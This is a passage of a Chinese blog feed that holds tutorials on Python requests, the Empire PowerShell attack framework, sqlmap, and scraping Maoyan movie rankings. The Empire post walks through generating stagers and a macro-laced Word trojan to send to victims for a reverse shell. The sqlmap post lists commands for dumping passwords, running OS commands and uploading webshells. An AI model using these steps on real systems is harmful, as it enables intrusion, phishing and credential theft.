punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取响应的cookie</span><span class="token keyword">for</span> key<span class="token punctuation">,</span>values <span class="token keyword">in</span> r<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>value<span class="token punctuation">)</span></code></pre><p><code>GET</code>请求维持会话使用<code>cookie</code></p><p>在<code>headers</code>里面加入<code>Cookie</code>字段，就可以维持会话。</p><p>建立<code>RequestCookieJar</code>对象，使用复制下来的<code>cookies</code>利用<code>split()</code>方法分割<code>cookie</code>,然后健值对给<code>jar</code>设置<code>cookie</code>,最后加到<code>POST</code>方法里面。</p><p>维持同一个会话，使用<code>session</code>对象，就相当于打开一个新的浏览器选项卡而不是新开一个浏览器，不用每次都设置<code>cookies</code>。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestss<span class="token operator">=</span>requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span></code></pre><p>它经常用于模拟登陆成功之后进一步的操作。</p><h3 id="2-5-SSL证书验证"><a href="#2-5-SSL证书验证" class="headerlink" title="2.5 SSL证书验证"></a>2.5 SSL证书验证</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages <span class="token keyword">import</span> urllib3urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#忽略警告的方式屏蔽警告</span>response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.12306.cn'</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#verify如果为TRUE会自动验证证书，我们忽略证书验证。</span></code></pre><h3 id="2-6-代理设置"><a href="#2-6-代理设置" class="headerlink" title="2.6 代理设置"></a>2.6 代理设置</h3><p>大规模爬取网站会弹出验证码，导致一定时间段无法访问，所以设置代理解决这个问题，需要用到<code>proxies</code>参数。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsproxies<span class="token operator">=</span><span class="token punctuation">{</span>      <span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://user:password@ip地址'</span><span class="token punctuation">}</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>proxies<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="2-7-超时设置"><a href="#2-7-超时设置" class="headerlink" title="2.7 超时设置"></a>2.7 超时设置</h3><p>有时候由于本机网络不好，我们等待很久才收到响应。为了防止这种情况，设置一个超时时间。增加一个<code>timeout</code>字段，单位为秒。永久等待设置为<code>None</code>或者不加参数。</p><h2 id="2-8-身份认证"><a href="#2-8-身份认证" class="headerlink" title="2.8 身份认证"></a>2.8 身份认证</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>auth<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h2 id="2-9-封装请求的数据结构Prepared-Request"><a href="#2-9-封装请求的数据结构Prepared-Request" class="headerlink" title="2.9 封装请求的数据结构Prepared Request"></a>2.9 封装请求的数据结构Prepared Request</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> Request<span class="token punctuation">,</span>Sessionurl<span class="token operator">=</span><span class="token string">''</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>s<span class="token operator">=</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>req<span class="token operator">=</span>Request<span class="token punctuation">(</span>method<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>pre<span class="token operator">=</span>s<span class="token punctuation">.</span>prepare_request<span class="token punctuation">(</span>req<span class="token punctuation">)</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p><code>requests</code>库为常用库，一定得掌握，<code>urllib</code>了解就<code>ok</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Empire-powershell渗透攻击框架工具</title>
      <link href="/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/"/>
      <url>/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="1-工具简介"><a href="#1-工具简介" class="headerlink" title="1. 工具简介"></a>1. 工具简介</h2><p><code>Empire</code>是一款针对<code>windows</code>平台的、使用<code>Powershell</code>脚本作为攻击载荷的渗透攻击框架工具，具有从<code>stager</code>生成、提权到渗透维持的一系列功能。<code>Empire</code>实现不需要<code>powershell.exe</code>就可以运行的<code>Powershell</code>代理功能，内置键盘记录、<code>Mimikatz</code>(提权，获取<code>hash</code>等)、绕过<code>UAC</code>、内网扫描等，并且能避免网络检测和大部分安全防护软件的查杀，总之就是一个基于<code>Powershell</code>的远程控制木马。具体可以参考官网</p><p><code>http://www.powershellempire.com/</code></p><h2 id="2-工具安装"><a href="#2-工具安装" class="headerlink" title="2. 工具安装"></a>2. 工具安装</h2><p><code>kali linux</code>下命令行从<code>github</code>将其下载下来</p><pre><code>git clone https://github.com/EmpireProject/Empire.git</code></pre><p>然后进入<code>Empire</code>的<code>setup</code>目录安装<code>Empire</code></p><pre><code>cd Empirecd setupsudo ./install.sh</code></pre><p>安装完成后打开<code>empire</code>，首先进入<code>Empire</code>目录</p><pre><code>./empire</code></pre><p>启动<code>empire</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsvyl51j30lx0g5n5w.jpg" alt></p><p>它和<code>msf</code>有着一样的原理，在<code>Kali</code>上设置一个端口监听反弹回来的木马连接，生成<code>powershell</code>木马在目标主机运行就会拿到<code>shell</code>。</p><h3 id="2-1-设置监听"><a href="#2-1-设置监听" class="headerlink" title="2.1 设置监听"></a>2.1 设置监听</h3><p>首先运行<code>help</code>，查看可使用的命令菜单。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw1ceuj30m90fzgw2.jpg" alt></p><p>接着输入<code>listeners</code>进入<code>listeners</code>模块，在使用<code>uselistener</code>设置采用何种模式，通过双击<code>Tab</code>键就可以展开模式</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw1q2jj30md0fvwnn.jpg" alt></p><p>前面是我实验建立的<code>lisener</code>，然后我们使用<code>userlistener http</code>使用<code>http</code>模式，然后输入<code>info</code>查看需要设置那些信息，和<code>msf</code>里面的<code>show options</code>异曲同工</p><p>然后再使用<code>set</code>设置参数，这里的<code>host</code>设置主机名：端口，也就是你攻击机器的<code>ip</code>，最后<code>execute</code>执行监听，执行完后，我们使用返回<code>back</code>命令，再<code>list</code>我们已经设置的监听。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw4oztj30m60gadpz.jpg" alt></p><p>使用<code>kill</code>可以杀掉已经设置的监听</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw09kjj30m70g2wof.jpg" alt></p><h3 id="2-2-生成木马"><a href="#2-2-生成木马" class="headerlink" title="2.2 生成木马"></a>2.2 生成木马</h3><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw3ad1j30m70gd13p.jpg" alt></p><p>使用<code>usestager</code>加上空格和<code>Tab</code>键得到可以设置的木马格式，有<code>dll</code>，<code>bat</code>，<code>jar</code>等格式的木马，我们先使用一个简单的木马，首先返回到<code>listeners</code>下，然后使用<code>launcher language listenername</code>很快生成一行<code>base64</code>编码的代码，如图所示</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw2tn8j30m70g2n8t.jpg" alt></p><p>然后复制粘贴我们的木马代码，直接再你要攻击的主机上的<code>cmd</code>下执行，我的电脑装的是火绒安全软件，并没有做出拦截。再<code>cmd</code>直接粘贴代码，会发现<code>cmd</code>一闪而过，接着你的木马已经上线。</p><p><img src alt></p><p>接下来输入<code>agents</code>就可以看到所有控制的主机了，我们可以使用:<code>rename 旧名字 新名字</code>给主机的控制进行重新命名。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw2ngrj30m70fygv6.jpg" alt> </p><p>使用<code>interact test2</code>就可以开始对我们控制的主机做坏事了，然后使用<code>help</code>就可以找到控制的功能</p><pre><code>shell ipconfig</code></pre><p>执行<code>cmd</code>下的<code>ipconfig</code>，查看网络配置</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw1r1hj30ly0gr48p.jpg" alt></p><p>接下来我们使用<code>launcher_vbs</code>木马试试，输入 </p><pre><code>usestager windows/launcher_vbs</code></pre><p>输入<code>info</code>查看配置的参数，设置<code>listener</code>为生成的<code>listener</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsw43kcj30lt0fwtis.jpg" alt></p><p>将其从<code>tmp</code>目录<code>copy</code>到<code>windows</code>主机双击，火绒又没拦截，主机上线。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsuv2amj30mn07275c.jpg" alt></p><p>生成<code>macro</code>木马插入<code>word</code>文档，增加迷惑性 </p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsv3k0bj31b70p9dhx.jpg" alt></p><p>生成<code>macro</code>,然后移动到<code>windows</code>上，新建一个木马的<code>word</code>文档，然后点击视图—&gt;&gt; 宏—-》创建宏，删除原来的代码，然后复制<code>macro</code>文档的代码粘贴进去，</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsv2y0ij30rq0q8mzh.jpg" alt></p><p>然后点击<code>ctrl+s</code>，保存为启用宏的文档</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsv4gt1j31ae0o940s.jpg" alt></p><p>保存后然后将其发给受害者，如果受害者打开，并且点击启用，就会反弹<code>shell</code></p><p>最强大的是<code>empire</code>可以给大黄鸭<code>bad_usb</code>嵌入代码，只要<code>usb</code>插到受害者的电脑，会瞬间弹出一个<code>cmd</code>窗口，然后反弹回<code>shell</code>，可惜大黄鸭板子太贵了，没钱了，不然又可以拿出来玩。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap工具总结</title>
      <link href="/2019/04/12/sqlmap-gong-ju-zong-jie/"/>
      <url>/2019/04/12/sqlmap-gong-ju-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="1-三种注入方式检测"><a href="#1-三种注入方式检测" class="headerlink" title="1. 三种注入方式检测"></a>1. 三种注入方式检测</h2><p><code>get</code>方式注入</p><pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2</code></pre><p><code>post</code>方式注入</p><pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data uname=ha</code></pre><p><code>cookie</code>注入</p><pre><code>python2 sqlmap.py -u &#39;网址&#39; --cookie uname=aja</code></pre><h2 id="2-数据库信息获取"><a href="#2-数据库信息获取" class="headerlink" title="2. 数据库信息获取"></a>2. 数据库信息获取</h2><p>获取当前用户下所有数据库</p><pre><code>python2 sqlmap.py -u &#39;&#39; --dbs</code></pre><p>获取数据库的表名</p><pre><code>python2 sqlmap.py -u &#39;&#39;-D 数据库名 --tables</code></pre><p>获取表中的字段</p><pre><code>python2 sqlmap.py -u &#39;&#39; -D 数据库名 -T 表名 --columns</code></pre><p>获取字段的内容</p><pre><code>python2 sqlmap.py -u &#39;&#39; -D 数据库名 -T 表名 -C 列名，列名 --dump</code></pre><p>获取所有用户（具有一定的权限）</p><pre><code>python2 sqlmap.py -u &#39;&#39; --users</code></pre><p>获取数据库用户的密码</p><pre><code>python2 sqlmap.py -u &#39;&#39; --passwords</code></pre><p>获取当前网站数据库的名称</p><pre><code>python2 sqlmap.py -u &#39;&#39; --current-db</code></pre><p>获取当前数据库的用户名称</p><pre><code>python2 sqlmap.py -u &#39;&#39; --current-user</code></pre><p>获取数据库的数据量</p><pre><code>python2 sqlmap.py -u &#39;&#39; -D 数据库名 --count</code></pre><p>判断用户权限：增删改查、写入读取文件、执行系统命令</p><pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --privileges</code></pre><p>简单的判断：<code>MSSQL</code>最高权限是<code>Sa</code>用户 <code>Mysql</code>最高权限是<code>root</code></p><p><code>sqlmap</code>不支持<code>Mongodb</code>和<code>nosql</code>所以新出来的开源<code>nosqlmap</code>支持可以去<code>github</code>上下载</p><p>管理自己的数据库得先在<code>github</code>上下载<code>pymysql</code>解压切换目录然后<code>setup.py install</code></p><pre><code>sqlmap.py -d mysql://用户名:密码@地址：端口/数据库 --sql-shell 进行sql语句的管理</code></pre><p>页面无变化，布尔无真假，从来不报错，延时注入</p><pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --delay -safe-freq</code></pre><p>交互式命令执行和写<code>webshell</code> </p><pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --os-cmd &#39;net user&#39;</code></pre><p>使用<code>tamper</code>绕过<code>waf</code></p><pre><code>python2 sqlmap.py -u &#39;&#39; --tamper=&#39;&#39;</code></pre><p>批量<code>sql</code>注入</p><pre><code>python2 sqlmap.py -m 文件</code></pre><h2 id="3-使用burpsuit批量扫描sql注入"><a href="#3-使用burpsuit批量扫描sql注入" class="headerlink" title="3. 使用burpsuit批量扫描sql注入"></a>3. 使用burpsuit批量扫描sql注入</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bfr7oysj318t0swjtl.jpg" alt></p><p>先在<code>burpsuit</code>中设置使用代理抓包并将其保存在<code>sqlmap</code>所在的目录下。然后使用</p><pre><code>python2 sqlmap.py -l burp.log --batch -smart</code></pre><p><code>--batch</code> 就是使用默认选项，<code>smart</code>是使用智能化的注入，它会根据头的注入，<code>cookie</code>和<code>post</code>,<code>get</code>的方式进行注入</p><h2 id="4-本地上传webshell"><a href="#4-本地上传webshell" class="headerlink" title="4. 本地上传webshell"></a>4. 本地上传webshell</h2><p>首先，在<code>sqlmap</code>所在的目录下创建一个目录<code>mst</code>，然后里面存放我们要上传的<code>webshell</code>,<br>其次，需要两个参数</p><pre><code>--file-write &#39;./mst/mst.txt&#39;--file-dest &#39;d:/www/1.php&#39;-v 等级 可以显示出注入的payload</code></pre><p>使用<code>burpsuit</code>结合<code>sqlmap</code>学习注入：参数 <code>--proxy=http：//127.0.0.1：8080</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python爬虫爬取猫眼电影</title>
      <link href="/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/"/>
      <url>/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/</url>
      
        <content type="html"><![CDATA[<h2 id="1-环境以及工具使用"><a href="#1-环境以及工具使用" class="headerlink" title="1. 环境以及工具使用"></a>1. 环境以及工具使用</h2><p>我们使用的是<code>python3</code>的<code>requests</code>库，<code>requests</code>比<code>urllib</code>更加的方便，同时使用正则表达式作为解析的工具。</p><p>在工具方便这次我们使用一个新的抓包工具用来对<code>http</code>协议的包进行分析</p><h3 id="1-1-工具介绍"><a href="#1-1-工具介绍" class="headerlink" title="1.1 工具介绍"></a>1.1 工具介绍</h3><p><code>Fiddler</code>的官方网址：<code>http://www.fiddler2.com/</code></p><p><code>Fiddler</code>是最强大最好用的<code>Web</code>调试工具之一，它能记录所有客户端和服务器的<code>http</code>和<code>https</code>请求，允许你监视，设置断点，甚至修改输入输出数据，<code>Fiddler</code>包含了一个强大的基于事件脚本的子系统，并且能使用<code>.net</code>语言进行扩展 你对<code>HTTP</code>协议越了解， 你就能越掌握<code>Fiddler</code>的使用方法。你越使用<code>Fiddler</code>，就越能帮助你了解<code>HTTP</code>协议。</p><p>为什么使用<code>Filddler</code>主要是使用特别方便，它还可以对手机进行抓包，自动监视所有的<code>http</code>协议。 给个简单的学习手册供大家学习：</p><p><a href="https://kb.cnblogs.com/page/130367/#introduce" target="_blank">https://kb.cnblogs.com/page/130367/#introduce</a></p><h2 id="2-实战"><a href="#2-实战" class="headerlink" title="2. 实战"></a>2. 实战</h2><p>首先设置打开<code>Fiddler</code>，然后浏览器输入<code>http://maoyan.com/board/4?offset=0</code>，然后点击第一条<code>request</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g2198kl7ghj31gk0re499.jpg" alt></p><p>我们可以看到右边的上侧是<code>request</code>,下面是<code>response</code>。</p><p>我们首先爬取第一页：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">get_one_page</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'</span>    <span class="token punctuation">}</span>    response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>  response<span class="token punctuation">.</span>text    <span class="token keyword">return</span>  None<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://maoyan.com/board/4'</span>    html<span class="token operator">=</span>get_one_page<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行成功得到第一页的数据，接下来我们需要进行一个解析，使用正则表达式分别获取电影排名、电影名称、主演、电影图片。 我们发现</p><pre><code>&lt;dd&gt;&lt;i class=&quot;board-index board-index-1&quot;&gt;1&lt;/i&gt;</code></pre><p>电影排名在这个<code>dd</code>标签，<code>i</code>标签的里面<code>1</code>就是排名，接下来我们构造正则表达式：</p><pre><code>&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;</code></pre><p><code>.?</code>就是非贪婪模式的匹配，<code>.</code>代表的是匹配任意字符，代表的是匹配前面字符无限次，让我联想到编译原理课的<code>*</code>闭包，就是乘以很多次。<code>()</code>就是我们要选择提取的字符。接下来我们需要解析影片的图片，</p><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/films/1203"</span> title<span class="token operator">=</span><span class="token string">"霸王别姬"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"image-link"</span> data<span class="token operator">-</span>act<span class="token operator">=</span><span class="token string">"boarditem-click"</span> data<span class="token operator">-</span>val<span class="token operator">=</span><span class="token string">"{movieId:1203}"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"//ms0.meituan.net/mywww/image/loading_2.e3d934bf.png"</span> alt<span class="token operator">=</span><span class="token string">""</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"poster-default"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>img data<span class="token operator">-</span>src<span class="token operator">=</span><span class="token string">"http://p1.meituan.net/movie/20803f59291c47e1e116c11963ce019e68711.jpg@160w_220h_1e_1c"</span> alt<span class="token operator">=</span><span class="token string">"霸王别姬"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"board-img"</span> <span class="token operator">/</span><span class="token operator">></span></code></pre><p>图片是第二个<code>img</code>标签里面的东西，正则表达式改写成为：<code>&lt;dd&gt;.*?board-index.*?&gt;&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;</code>接下来提取名称，</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>board-index board-index-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/films/1203<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>霸王别姬<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image-link<span class="token punctuation">"</span></span> <span class="token attr-name">data-act</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>boarditem-click<span class="token punctuation">"</span></span> <span class="token attr-name">data-val</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{movieId:1203}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//ms0.meituan.net/mywww/image/loading_2.e3d934bf.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>poster-default<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://p1.meituan.net/movie/20803f59291c47e1e116c11963ce019e68711.jpg@160w_220h_1e_1c<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>霸王别姬<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>board-img<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>board-item-main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>board-item-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie-item-info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/films/1203<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>霸王别姬<span class="token punctuation">"</span></span> <span class="token attr-name">data-act</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>boarditem-click<span class="token punctuation">"</span></span> <span class="token attr-name">data-val</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{movieId:1203}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>霸王别姬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>star<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>主演：张国荣,张丰毅,巩俐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>releasetime<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上映时间：1993-01-01(中国香港)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie-item-number score-num<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>integer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>9.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fraction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>电影名称在<code>p</code>节点，<code>class</code>为<code>name</code>，所以用<code>name</code>做标志位，提取<code>a</code>节点里面的正文内容，同时提取主演、发布时间、评分等内容，改写正则表达式</p><pre><code>&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;.*?name.*?a.*?&gt;(.*?)&lt;/a&gt;.*?star.*?&gt;(.*?)&lt;/p&gt;.*?releasetime.*?&gt;(.*?)&lt;/p&gt;.*?integer.*?&gt;(.*?)&lt;/i&gt;.*?fraction.*?(.*?)&lt;/i&gt;.*?&lt;/dd&gt;</code></pre><p>最后调用<code>findall()</code>提取所有的内容。</p><p>完整代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">get_one_page</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'</span>    <span class="token punctuation">}</span>    response<span class="token operator">=</span>requests<span class="token 